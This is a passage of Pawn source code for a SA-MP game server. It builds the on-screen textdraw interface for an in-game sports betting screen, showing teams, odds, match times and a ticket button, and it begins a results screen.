		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 8 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 8 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 8 ], 4);

		KladionicaSM[ playerid ][ 9 ] = CreatePlayerTextDraw(playerid, 109.250000, 204.249938, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 9 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 9 ], 413.750000, -0.583323);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 9 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 9 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 9 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 9 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 9 ], 4);

		KladionicaSM[ playerid ][ 10 ] = CreatePlayerTextDraw(playerid, 109.625000, 212.833236, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 10 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 10 ], 413.125000, 0.583343);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 10 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 10 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 10 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 10 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 10 ], 4);

		KladionicaSM[ playerid ][ 11 ] = CreatePlayerTextDraw(playerid, 110.625000, 221.999908, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 11 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 11 ], 412.500000, 0.583343);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 11 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 11 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 11 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 11 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 11 ], 4);

		KladionicaSM[ playerid ][ 12 ] = CreatePlayerTextDraw(playerid, 109.750000, 229.999908, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 12 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 12 ], 413.750000, 0.583343);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 12 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 12 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 12 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 12 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 12 ], 4);

		KladionicaSM[ playerid ][ 13 ] = CreatePlayerTextDraw(playerid, 109.500000, 238.583175, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 13 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 13 ], 413.125000, 0.583343);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 13 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 13 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 13 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 13 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 13 ], 4);

		KladionicaSM[ playerid ][ 14 ] = CreatePlayerTextDraw(playerid, 110.500000, 245.999816, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 14 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 14 ], 413.125000, 0.583343);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 14 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 14 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 14 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 14 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 14 ], 4);

		KladionicaSM[ playerid ][ 15 ] = CreatePlayerTextDraw(playerid, 236.625000, 171.916595, "Domacin");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 15 ], 0.271249, 0.969998);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 15 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 15 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 15 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 15 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 15 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 15 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 15 ], 1);

		KladionicaSM[ playerid ][ 16 ] = CreatePlayerTextDraw(playerid, 109.000000, 254.583099, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 16 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 16 ], 414.375000, -0.583323);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 16 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 16 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 16 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 16 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 16 ], 4);

		KladionicaSM[ playerid ][ 17 ] = CreatePlayerTextDraw(playerid, 110.625000, 263.166473, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 17 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 17 ], 412.500000, 0.583343);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 17 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 17 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 17 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 17 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 17 ], 4);

		KladionicaSM[ playerid ][ 18 ] = CreatePlayerTextDraw(playerid, 111.000000, 272.333190, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 18 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 18 ], 412.500000, 0.583343);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 18 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 18 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 18 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 18 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 18 ], 4);

		KladionicaSM[ playerid ][ 19 ] = CreatePlayerTextDraw(playerid, 362.000000, 171.166625, "GOst");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 19 ], 0.271249, 0.969998);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 19 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 19 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 19 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 19 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 19 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 19 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 19 ], 1);

		KladionicaSM[ playerid ][ 20 ] = CreatePlayerTextDraw(playerid, 453.000000, 171.583297, "1     x     2");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 20 ], 0.271249, 0.969998);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 20 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 20 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 20 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 20 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 20 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 20 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 20 ], 1);

		KladionicaSM[ playerid ][ 21 ] = CreatePlayerTextDraw(playerid, 206.000000, 147.416580, "Valhalla Kladionica");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 21 ], 0.751250, 1.529998);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 21 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 21 ], SRVBOJA1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 21 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 21 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 21 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 21 ], 0);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 21 ], 1);

		KladionicaSM[ playerid ][ 22 ] = CreatePlayerTextDraw(playerid, 472.625000, 297.749969, "Valhalla");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 22 ], 0.751250, 1.529998);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 22 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 22 ], SRVBOJA1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 22 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 22 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 22 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 22 ], 0);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 22 ], 1);

		KladionicaSM[ playerid ][ 23 ] = CreatePlayerTextDraw(playerid, 154.125000, 309.916778, "www.valhalla-ogc.com");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 23 ], 0.228749, 0.719165);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 23 ], 2);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 23 ], SRVBOJA1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 23 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 23 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 23 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 23 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 23 ], 1);

		KladionicaSM[ playerid ][ 24 ] = CreatePlayerTextDraw(playerid, 208.125000, 168.583343, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 24 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 24 ], 0.625000, 104.416656);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 24 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 24 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 24 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 24 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 24 ], 4);

		KladionicaSM[ playerid ][ 25 ] = CreatePlayerTextDraw(playerid, 322.875000, 167.833328, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 25 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 25 ], 0.625000, 104.416656);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 25 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 25 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 25 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 25 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 25 ], 4);

		KladionicaSM[ playerid ][ 26 ] = CreatePlayerTextDraw(playerid, 439.500000, 167.083343, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 26 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 26 ], 0.625000, 104.416656);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 26 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 26 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 26 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 26 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 26 ], 4);

		KladionicaSM[ playerid ][ 27 ] = CreatePlayerTextDraw(playerid, 465.500000, 167.500015, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 27 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 27 ], 0.625000, 104.416656);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 27 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 27 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 27 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 27 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 27 ], 4);

		KladionicaSM[ playerid ][ 28 ] = CreatePlayerTextDraw(playerid, 491.500000, 168.500015, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 28 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 28 ], 0.625000, 104.416656);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 28 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 28 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 28 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 28 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 28 ], 4);

		KladionicaSM[ playerid ][ 29 ] = CreatePlayerTextDraw(playerid, 517.750000, 168.500015, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 29 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 29 ], 0.625000, 104.416656);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 29 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 29 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 29 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 29 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 29 ], 4);

		KladionicaSM[ playerid ][ 30 ] = CreatePlayerTextDraw(playerid, 113.750000, 167.749984, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 30 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 30 ], 0.625000, 104.416656);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 30 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 30 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 30 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 30 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 30 ], 4);

		KladionicaSM[ playerid ][ 31 ] = CreatePlayerTextDraw(playerid, 320.750000, 305.916625, "Uplati tiket");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 31 ], 0.271249, 0.969998);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 31 ], 2);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 31 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 31 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 31 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 31 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 31 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 31 ], 1);
		PlayerTextDrawSetSelectable(playerid, KladionicaSM[ playerid ][ 31 ], true);
		
		new str[ 256 ];
		
		format( str, sizeof( str ), "%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s",
			bettingInfo[ Parovi[ 0 ][ parID ][ 0 ] ][ teamName ],
			bettingInfo[ Parovi[ 1 ][ parID ][ 0 ] ][ teamName ],
			bettingInfo[ Parovi[ 2 ][ parID ][ 0 ] ][ teamName ],
			bettingInfo[ Parovi[ 3 ][ parID ][ 0 ] ][ teamName ],
			bettingInfo[ Parovi[ 4 ][ parID ][ 0 ] ][ teamName ],
			bettingInfo[ Parovi[ 5 ][ parID ][ 0 ] ][ teamName ],
			bettingInfo[ Parovi[ 6 ][ parID ][ 0 ] ][ teamName ],
			bettingInfo[ Parovi[ 7 ][ parID ][ 0 ] ][ teamName ],
			bettingInfo[ Parovi[ 8 ][ parID ][ 0 ] ][ teamName ],
			bettingInfo[ Parovi[ 9 ][ parID ][ 0 ] ][ teamName ] );

	 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 4 ], str );
	 	
	 	format( str, sizeof( str ), "%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s",
			bettingInfo[ Parovi[ 0 ][ parID ][ 1 ] ][ teamName ],
			bettingInfo[ Parovi[ 1 ][ parID ][ 1 ] ][ teamName ],
			bettingInfo[ Parovi[ 2 ][ parID ][ 1 ] ][ teamName ],
			bettingInfo[ Parovi[ 3 ][ parID ][ 1 ] ][ teamName ],
			bettingInfo[ Parovi[ 4 ][ parID ][ 1 ] ][ teamName ],
			bettingInfo[ Parovi[ 5 ][ parID ][ 1 ] ][ teamName ],
			bettingInfo[ Parovi[ 6 ][ parID ][ 1 ] ][ teamName ],
			bettingInfo[ Parovi[ 7 ][ parID ][ 1 ] ][ teamName ],
			bettingInfo[ Parovi[ 8 ][ parID ][ 1 ] ][ teamName ],
			bettingInfo[ Parovi[ 9 ][ parID ][ 1 ] ][ teamName ] );

	 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 6 ], str );
	 	
	 	format( str, sizeof( str ), "%.2f %.2f %.2f~n~%.2f %.2f %.2f~n~%.2f %.2f %.2f~n~%.2f %.2f %.2f~n~%.2f %.2f %.2f~n~%.2f %.2f %.2f~n~%.2f %.2f %.2f~n~%.2f %.2f %.2f~n~%.2f %.2f %.2f~n~%.2f %.2f %.2f",
			Parovi[ 0 ][ Kvota ][ 0 ], Parovi[ 0 ][ Kvota ][ 2 ], Parovi[ 0 ][ Kvota ][ 1 ],
            Parovi[ 1 ][ Kvota ][ 0 ], Parovi[ 1 ][ Kvota ][ 2 ], Parovi[ 1 ][ Kvota ][ 1 ],
            Parovi[ 2 ][ Kvota ][ 0 ], Parovi[ 2 ][ Kvota ][ 2 ], Parovi[ 2 ][ Kvota ][ 1 ],
            Parovi[ 3 ][ Kvota ][ 0 ], Parovi[ 3 ][ Kvota ][ 2 ], Parovi[ 3 ][ Kvota ][ 1 ],
            Parovi[ 4 ][ Kvota ][ 0 ], Parovi[ 4 ][ Kvota ][ 2 ], Parovi[ 4 ][ Kvota ][ 1 ],
            Parovi[ 5 ][ Kvota ][ 0 ], Parovi[ 5 ][ Kvota ][ 2 ], Parovi[ 5 ][ Kvota ][ 1 ],
            Parovi[ 6 ][ Kvota ][ 0 ], Parovi[ 6 ][ Kvota ][ 2 ], Parovi[ 6 ][ Kvota ][ 1 ],
            Parovi[ 7 ][ Kvota ][ 0 ], Parovi[ 7 ][ Kvota ][ 2 ], Parovi[ 7 ][ Kvota ][ 1 ],
            Parovi[ 8 ][ Kvota ][ 0 ], Parovi[ 8 ][ Kvota ][ 2 ], Parovi[ 8 ][ Kvota ][ 1 ],
            Parovi[ 9 ][ Kvota ][ 0 ], Parovi[ 9 ][ Kvota ][ 2 ], Parovi[ 9 ][ Kvota ][ 1 ]
		);

	 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 7 ], str );
		
		new hour, minute, second, day, year, month;
		getdate( year, month, day );
		gettimeEx( hour, minute, second );
		FixHour( hour );
		hour = shifthour;
		
		format( str, sizeof( str ), "%d.%d.%d %02d:30~n~%d.%d.%d %02d:30~n~%d.%d.%d %02d:30~n~%d.%d.%d %02d:30~n~%d.%d.%d %02d:30~n~%d.%d.%d %02d:30~n~%d.%d.%d %02d:30~n~%d.%d.%d %02d:30~n~%d.%d.%d %02d:30~n~%d.%d.%d %02d:30",
			day, month, year, hour,
			day, month, year, hour,
			day, month, year, hour,
			day, month, year, hour,
			day, month, year, hour,
			day, month, year, hour,
			day, month, year, hour,
			day, month, year, hour,
			day, month, year, hour,
			day, month, year, hour );

	 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 5 ], str );
		
		for( new i = 0; i < 32; i ++ ) {
		
			PlayerTextDrawShow( playerid, KladionicaSM[ playerid ][ i ] );
		}
		SelectTextDraw( playerid, SRVBOJA1 );
		
		ListaPrikazana[ playerid ] = true;

	}
	else if( show == false ) {
	
		for( new i = 0; i < 32; i ++) {
		
		    PlayerTextDrawHide( playerid, KladionicaSM[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, KladionicaSM[ playerid ][ i ] );
			KladionicaSM[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}
		CancelSelectTextDraw( playerid );
		
		ListaPrikazana[ playerid ] = false;
	}
}

stock RezultatiTDControl( playerid, bool:show ) {

	if( show == true ) {

		KladionicaSM[ playerid ][ 0 ] = CreatePlayerTextDraw(playerid, 525.125000, 143.250000, "usebox");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 0 ], 0.000000, 19.127779);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 0 ], 108.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 0 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 0 ], 0);
		PlayerTextDrawUseBox(playerid, KladionicaSM[ playerid ][ 0 ], true);
		PlayerTextDrawBoxColor(playerid, KladionicaSM[ playerid ][ 0 ], 102);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 0 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 0 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 0 ], 0);

		KladionicaSM[ playerid ][ 1 ] = CreatePlayerTextDraw(playerid, 115.625000, 172.083236, "Vreme i datum");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 1 ], 0.271249, 0.969998);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 1 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 1 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 1 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 1 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 1 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 1 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 1 ], 1);

		KladionicaSM[ playerid ][ 2 ] = CreatePlayerTextDraw(playerid, 110.000000, 186.083328, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 2 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 2 ], 413.125000, -0.583323);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 2 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 2 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 2 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 2 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 2 ], 4);

		KladionicaSM[ playerid ][ 3 ] = CreatePlayerTextDraw(playerid, 110.375000, 167.833374, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 3 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 3 ], 412.500000, 0.583343);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 3 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 3 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 3 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 3 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 3 ], 4);

		KladionicaSM[ playerid ][ 4 ] = CreatePlayerTextDraw(playerid, 266.125000, 186.750015, "Manchester United~n~Manchester United~n~Manchester United~n~Manchester United~n~Manchester United~n~Manchester United~n~Manches");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 4 ], 0.249374, 0.940831);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 4 ], 2);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 4 ], SRVBOJA1 );
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 4 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 4 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 4 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 4 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 4 ], 1);

		KladionicaSM[ playerid ][ 5 ] = CreatePlayerTextDraw(playerid, 114.500000, 187.500045, "29.09.2015 20:45~n~29.09.2015 20:45~n~29.09.2015 20:45~n~29.09.2015 20:45~n~29.09.2015 20:45~n~29.09.2015 20:45~n~29.09.2015 20");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 5 ], 0.249374, 0.940831);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 5 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 5 ], SRVBOJA1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 5 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 5 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 5 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 5 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 5 ], 1);

		KladionicaSM[ playerid ][ 6 ] = CreatePlayerTextDraw(playerid, 381.500000, 187.166671, "Manchester United~n~Manchester United~n~Manchester United~n~Manchester United~n~Manchester United~n~Manchester United~n~Manches");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 6 ], 0.249374, 0.940831);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 6 ], 2);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 6 ], SRVBOJA1 );
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 6 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 6 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 6 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 6 ], 2);
